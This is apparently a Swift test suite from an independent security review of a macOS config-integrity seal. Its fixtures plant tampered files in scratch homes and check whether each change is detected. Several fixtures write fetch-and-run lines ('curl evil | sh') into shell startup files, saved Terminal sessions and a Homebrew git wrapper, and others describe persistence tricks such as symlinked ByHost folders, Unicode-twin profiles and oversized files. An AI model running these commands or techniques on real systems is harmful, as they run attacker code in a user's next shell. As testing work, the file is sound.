import Foundation
import Testing
@testable import VibeCore

/// The independent review of v2-mac-seal-list (review-v2-s-mac-5): each test states what the seal must do; a red one is
/// a finding (.review-notes/findings.md). Scratch homes and roots only, never the user's files.
struct MacSealReviewTests {
    let temp = Scratch()

    func home() throws -> String {
        let url = temp.url("review-home")
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        return url.resolvingSymlinksInPath().path
    }

    func terminalRow(_ home: String) throws -> ConfigSeal.Watched {
        try #require(MacSealList.watched(home: home, uid: getuid()).first { $0.kind == .preferences })
    }

    func prints(_ items: [ConfigSeal.Watched]) -> [String: String] {
        Dictionary(items.map { ($0.name, ConfigSeal.fingerprint($0) ?? "nil") }) { first, _ in first }
    }

    // MARK: Terminal's row (.preferences)

    /// R1. The home's volume is case-insensitive (APFS's default), so cfprefsd's open of
    /// `ByHost/com.apple.Terminal.<host>.plist` finds a file named `com.apple.terminal.<host>.plist`; the seal's name
    /// filter is case-sensitive and skips it.
    @Test(MacSealListTests.mac) func aByHostFileNamedInAnotherCaseIsAChange() throws {
        let home = try home()
        let row = try terminalRow(home)
        let byHost = (row.path as NSString).deletingLastPathComponent + "/ByHost"
        try MacSealListTests.writePlist(MacSealListTests.terminal(), row.path)
        try FileManager.default.createDirectory(atPath: byHost, withIntermediateDirectories: true)
        let sealed = ConfigSeal.fingerprint(row)
        let host = "00000000-0000-0000-0000-0000000000AA"
        try MacSealListTests.writePlist(["Shell": "/opt/evil"], byHost + "/com.apple.terminal.\(host).plist")
        // The name cfprefsd builds opens the planted file on this volume.
        let canonical = byHost + "/com.apple.Terminal.\(host).plist"
        let opened = (try? Data(contentsOf: URL(fileURLWithPath: canonical))).flatMap {
            try? PropertyListSerialization.propertyList(from: $0, options: [], format: nil) as? [String: Any]
        }
        #expect(opened?["Shell"] as? String == "/opt/evil", "the volume is case-sensitive here: the attack needs a case-insensitive one")
        #expect(ConfigSeal.fingerprint(row) != sealed, "a ByHost file cfprefsd reads held nothing")
    }

    /// R2. The ByHost folder replaced by a link to a folder holding a Terminal ByHost file: hashed "not a folder", so
    /// once that is accepted, the linked file's keys change unseen.
    @Test(MacSealListTests.mac) func aByHostFolderMadeALinkStillReadsItsFiles() throws {
        let home = try home()
        let row = try terminalRow(home)
        let byHost = (row.path as NSString).deletingLastPathComponent + "/ByHost"
        try MacSealListTests.writePlist(MacSealListTests.terminal(), row.path)
        let elsewhere = temp.url("elsewhere-byhost").path
        let file = elsewhere + "/com.apple.Terminal.00000000-0000-0000-0000-0000000000AA.plist"
        try MacSealListTests.writePlist(["Shell": "/bin/zsh"], file)
        try FileManager.default.createSymbolicLink(atPath: byHost, withDestinationPath: elsewhere)
        let accepted = ConfigSeal.fingerprint(row)
        try MacSealListTests.writePlist(["Shell": "/opt/evil"], file)
        #expect(ConfigSeal.fingerprint(row) != accepted, "a ByHost file behind a linked ByHost folder changed unseen")
    }

    /// R3. Two profiles whose names are canonically equivalent (NFC "Café", NFD "Café") are two keys to Terminal
    /// (CFDictionary compares code points) but one to a Swift `[String: Any]`: `canonical` drops one, and its
    /// CommandString changes unseen.
    @Test(MacSealListTests.mac) func profilesWhoseNamesAreUnicodeEqualAreBothHashed() throws {
        let home = try home()
        let row = try terminalRow(home)
        let write = { (command: String) in
            let profiles = NSMutableDictionary()
            profiles["Caf\u{E9}" as NSString] = ["name": "Caf\u{E9}", "CommandString": "echo hi"]
            profiles["Cafe\u{301}" as NSString] = ["name": "Cafe\u{301}", "CommandString": command]
            try MacSealListTests.writePlist(MacSealListTests.terminal(["Window Settings": profiles, "Default Window Settings": "Cafe\u{301}"]), row.path)
        }
        try write("echo hi")
        let sealed = ConfigSeal.fingerprint(row)
        try write("curl evil | sh")
        #expect(ConfigSeal.fingerprint(row) != sealed, "the default profile's CommandString changed unseen")
    }

    /// R3, each twin in turn: whichever survives the bridge, a change to the other must be seen too.
    @Test(MacSealListTests.mac) func eachOfTwoUnicodeEqualProfilesIsHashed() throws {
        let home = try home()
        let row = try terminalRow(home)
        let write = { (nfc: String, nfd: String) in
            let profiles = NSMutableDictionary()
            profiles["Caf\u{E9}" as NSString] = ["CommandString": nfc]
            profiles["Cafe\u{301}" as NSString] = ["CommandString": nfd]
            try MacSealListTests.writePlist(MacSealListTests.terminal(["Window Settings": profiles]), row.path)
        }
        try write("a", "a")
        let sealed = ConfigSeal.fingerprint(row)
        try write("evil", "a")
        #expect(ConfigSeal.fingerprint(row) != sealed, "the NFC twin's command changed unseen")
        try write("a", "evil")
        #expect(ConfigSeal.fingerprint(row) != sealed, "the NFD twin's command changed unseen")
    }

    /// R2b. A Terminal file past `preferencesLimit` (16 MB) hashes as a constant "unreadable": once that is accepted,
    /// its `Shell` changes unseen (cfprefsd still reads it: assumed, not measured here).
    @Test(MacSealListTests.mac) func anOversizedPreferencesFileStillHashesItsKeys() throws {
        let home = try home()
        let row = try terminalRow(home)
        let pad = Data(repeating: 7, count: MacSealList.preferencesLimit + 1)
        try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/bin/zsh", "Pad": pad]), row.path)
        let accepted = ConfigSeal.fingerprint(row)
        try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/opt/evi", "Pad": pad]), row.path)
        #expect(ConfigSeal.fingerprint(row) != accepted, "Shell changed in an oversized file: unseen")
    }

    /// R4 (a note). A 64-bit unsigned integer past Int64's range reads as `int64Value` -1: two different values, one form.
    @Test(MacSealListTests.mac) func aLargeUnsignedIntegerIsntMinusOne() {
        #expect(MacSealList.canonical(NSNumber(value: UInt64.max)) != MacSealList.canonical(NSNumber(value: Int64(-1))))
    }

    /// Passes: an integer from a binary or XML plist is never a boolean (objCType "q"/"i", a boolean "c").
    @Test(MacSealListTests.mac) func smallIntegersFromEitherFormatArentBooleans() throws {
        for format in [PropertyListSerialization.PropertyListFormat.binary, .xml] {
            let data = try PropertyListSerialization.data(fromPropertyList: ["a": 1, "b": true, "c": 0, "d": false, "e": 2] as [String: Any], format: format, options: 0)
            let top = try #require(try PropertyListSerialization.propertyList(from: data, options: [], format: nil) as? [String: Any])
            #expect(MacSealList.canonical(top["a"] as Any) != MacSealList.canonical(top["b"] as Any))
            #expect(MacSealList.canonical(top["c"] as Any) != MacSealList.canonical(top["d"] as Any))
            #expect(MacSealList.canonical(top["e"] as Any) == "i2")
        }
    }

    /// Passes: a link at the preferences' parent folder reads through it, and a change behind it is a change.
    @Test(MacSealListTests.mac) func aLinkedPreferencesFolderIsReadThrough() throws {
        let home = try home()
        let real = temp.url("real-prefs").path
        try MacSealListTests.writePlist(MacSealListTests.terminal(), real + "/com.apple.Terminal.plist")
        try FileManager.default.createDirectory(atPath: home + "/Library", withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: home + "/Library/Preferences", withDestinationPath: real)
        let row = try terminalRow(home)
        let before = ConfigSeal.fingerprint(row)
        try MacSealListTests.writePlist(MacSealListTests.terminal(["Shell": "/opt/evil"]), real + "/com.apple.Terminal.plist")
        #expect(ConfigSeal.fingerprint(row) != before)
    }

    // MARK: Rows the list doesn't have

    /// R5. Terminal's zsh (`/etc/zshrc_Apple_Terminal`) sources `~/.zsh_sessions/<TERM_SESSION_ID>.session` when it
    /// restores a window (its first line `echo Restored session: …`): a line appended to a saved session runs in the
    /// next Terminal the user opens. No row reads that folder.
    @Test(MacSealListTests.mac) func aSavedTerminalSessionTheShellSourcesIsWatched() throws {
        let home = try home()
        let session = home + "/.zsh_sessions/07B1167C-0988-48C7-99DB-7B7166F19E24.session"
        try MacSealListTests.write("echo Restored session: \"$(/bin/date -r 1795000000)\"\n", session)
        let list = { MacSealList.watched(home: home, uid: getuid()) + ConfigSeal.homeWatched(home: home) }
        let before = prints(list())
        try MacSealListTests.write("echo Restored session: \"$(/bin/date -r 1795000000)\"\ncurl evil | sh\n", session)
        let after = prints(list())
        #expect(after != before, "a saved Terminal session changed: no row saw it")
    }

    /// R6 (inherited from Linux's `sourced`, one level only). A file sourced by a sourced file is no row: after the
    /// sourced file's change (a card that shows none of its text) is accepted, its target changes unseen.
    @Test(MacSealListTests.mac) func aFileASourcedFileSourcesIsWatched() throws {
        let home = try home()
        try MacSealListTests.write("source ~/.zsh/aliases.zsh\n", home + "/.zshrc")
        try MacSealListTests.write("source ~/.zsh/more.zsh\n", home + "/.zsh/aliases.zsh")
        try MacSealListTests.write("alias ll='ls -l'\n", home + "/.zsh/more.zsh")
        let list = { MacSealList.watched(home: home, uid: getuid()) + ConfigSeal.homeWatched(home: home) }
        let before = prints(list())
        try MacSealListTests.write("curl evil | sh\n", home + "/.zsh/more.zsh")
        #expect(prints(list()) != before, "a file the shell sources changed: no row saw it")
    }

    /// R6b (inherited from Linux's `sourced`). The forms its pattern doesn't read: a variable other than HOME (oh-my-zsh's
    /// `$ZSH`), a loop over a glob. Their targets are no rows.
    @Test(MacSealListTests.mac) func sourceFormsThePatternMissesAreWatched() throws {
        let home = try home()
        try MacSealListTests.write("export ZSH=\"$HOME/.oh-my-zsh\"\nsource $ZSH/oh-my-zsh.sh\nfor f in ~/.zsh.d/*.zsh; do source \"$f\"; done\n", home + "/.zshrc")
        try MacSealListTests.write("echo omz\n", home + "/.oh-my-zsh/oh-my-zsh.sh")
        try MacSealListTests.write("echo one\n", home + "/.zsh.d/one.zsh")
        let list = { MacSealList.watched(home: home, uid: getuid()) + ConfigSeal.homeWatched(home: home) }
        let before = prints(list())
        // Owed (the fix round, 2026-11-26): `sourced` reads `~`, `$HOME`, `${HOME}` and the home's own path only.
        try withKnownIssue("owed: R6b, a variable other than HOME and a glob loop aren't read (the spec's owed for the switch-on)") {
            try MacSealListTests.write("curl evil | sh\n", home + "/.oh-my-zsh/oh-my-zsh.sh")
            #expect(prints(list()) != before, "oh-my-zsh's file changed: no row saw it")
            let middle = prints(list())
            try MacSealListTests.write("curl evil | sh\n", home + "/.zsh.d/one.zsh")
            #expect(prints(list()) != middle, "a globbed file changed: no row saw it")
        }
    }

    /// R6c (inherited). A `.zshrc` past 1 MB names no sourced file: once its padding is accepted, the file it sources
    /// is no row.
    @Test(MacSealListTests.mac) func anOversizedStartupFileStillNamesWhatItSources() throws {
        let home = try home()
        try MacSealListTests.write("source ~/.config/x/key.env\n" + String(repeating: "#\n", count: 1 << 19) + "\n", home + "/.zshrc")
        #expect(MacSealList.watched(home: home, uid: getuid()).contains { $0.name == "~/.config/x/key.env" })
    }

    /// Passes: the rows outside the home are the node-wide seal's in every key form the vault keeps.
    @Test(MacSealListTests.mac) func theOutsideRowsAreHomeInEveryKeyForm() {
        for (name, _) in MacSealList.outsideEntries {
            let key = ConfigSeal.keyPrefix + name
            for form in [key, ConfigSeal.keysKey(of: key), ConfigSeal.goneKey(of: key), ConfigSeal.bookkeepingKey(of: key)] {
                #expect(ConfigSeal.isHome(key: form), "\(form)")
            }
        }
        #expect(!ConfigSeal.isHome(key: ConfigSeal.keyPrefix + "/opt/homebrew/bin/x"))
        #expect(!ConfigSeal.isHome(key: ConfigSeal.keyPrefix + "/opt/homebrew"))
    }

    /// R7 (the stated limit, shown). A Cellar file behind a Homebrew link rewritten in place: the listing reads the
    /// link, never its target.
    @Test(MacSealListTests.mac) func aCellarFileBehindABinLinkRewrittenInPlace() throws {
        let home = try home()
        let outside = temp.url("review-outside").path
        let cellar = outside + "/opt/homebrew/Cellar/git/2.47/bin/git"
        try MacSealListTests.write("#!/bin/sh\nexec real-git \"$@\"\n", cellar)
        try FileManager.default.createDirectory(atPath: outside + "/opt/homebrew/bin", withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: outside + "/opt/homebrew/bin/git", withDestinationPath: "../Cellar/git/2.47/bin/git")
        let list = { MacSealList.watched(home: home, uid: getuid(), outside: outside) }
        let before = prints(list())
        try MacSealListTests.write("#!/bin/sh\ncurl evil|sh\n", cellar)
        #expect(prints(list()) != before, "git rewritten behind /opt/homebrew/bin/git: unseen")
    }
}

/// The held-change path for the Mac rows, through the fixture vault (MacSealVaultTests' own fixture).
struct MacSealReviewVaultTests {
    let fixture = MacSealVaultTests()
    var home: String { fixture.home }

    /// Passes: a second change while one is held is held anew; the first card's accept doesn't take it; the second
    /// card's does.
    @Test(MacSealListTests.mac) func aSecondChangeWhileHeldIsntTakenByTheFirstCard() throws {
        fixture.book.watchesMacList = true
        try fixture.seedRows()
        let (root, lead) = try fixture.team()
        try fixture.write("evil 1\n", home + "/.local/bin/git")
        #expect(try lead.checkConfig(root: root).held == ["~/.local/bin"])
        let first = ConfigSeal.heldHashes(in: try fixture.vault.guardedRecord(root: root))
        try fixture.write("evil 22\n", home + "/.local/bin/git")
        #expect(try lead.checkConfig(root: root).held == ["~/.local/bin"])
        _ = try fixture.vault.checkConfig(root: root, shown: first)
        #expect(try lead.checkConfig(root: root).held == ["~/.local/bin"], "the first card's accept took a change it never showed")
        let second = ConfigSeal.heldHashes(in: try fixture.vault.guardedRecord(root: root))
        _ = try fixture.vault.checkConfig(root: root, shown: second)
        #expect(try lead.checkConfig(root: root).held.isEmpty)
    }

    /// Passes: a look made while the book doesn't watch the list (a new host image before its server child is set)
    /// neither forgets what is held nor seals a change made meanwhile.
    @Test(MacSealListTests.mac) func aLookWithTheListOffKeepsWhatIsHeldAndSealsNothingOfIt() throws {
        fixture.book.watchesMacList = true
        try fixture.seedRows()
        let (root, lead) = try fixture.team()
        try fixture.write("evil\n", home + "/Library/LaunchAgents/com.evil.plist")
        #expect(try lead.checkConfig(root: root).held == ["~/Library/LaunchAgents"])
        fixture.book.watchesMacList = false
        _ = try lead.checkConfig(root: root)
        try fixture.write("evil\n", home + "/.local/bin/git")
        _ = try lead.checkConfig(root: root)
        _ = try fixture.vault.checkConfig(root: root)
        fixture.book.watchesMacList = true
        #expect(Set(try lead.checkConfig(root: root).held) == ["~/Library/LaunchAgents", "~/.local/bin"])
    }

    /// R9. A Mac node's vault never holds its first look (`VaultFirstLook.holds` is Linux's only): a row the book reads
    /// for the first time (the list switched on, or a node book made after the app's workers wrote the rows unsealed)
    /// is recorded as it is, a planted LaunchAgent with it.
    @Test(MacSealListTests.mac) func aRowFirstReadWithAPlantedAgentIsHeld() throws {
        try fixture.seedRows()
        let (root, lead) = try fixture.team()
        try fixture.write("<plist>evil</plist>\n", home + "/Library/LaunchAgents/com.evil.agent.plist")
        fixture.book.watchesMacList = true
        #expect(try lead.checkConfig(root: root).held.contains("~/Library/LaunchAgents"), "a planted agent at the first look was taken as the baseline")
    }

    /// R8 (a note on daily use). A listing row's card names no entry: Claude Code's update and a planted
    /// `~/.local/bin/git` read the same, "~/.local/bin" with nothing said.
    @Test(MacSealListTests.mac) func aListingRowsCardNamesWhatChanged() throws {
        fixture.book.watchesMacList = true
        try fixture.seedRows()
        let (root, lead) = try fixture.team()
        try fixture.write("evil\n", home + "/.local/bin/git")
        _ = try lead.checkConfig(root: root)
        let said = ConfigSeal.heldChanges(in: try fixture.vault.guardedRecord(root: root))["~/.local/bin"]
        #expect(said?.contains("git") == true, "the card says: \(said ?? "nothing")")
    }
}
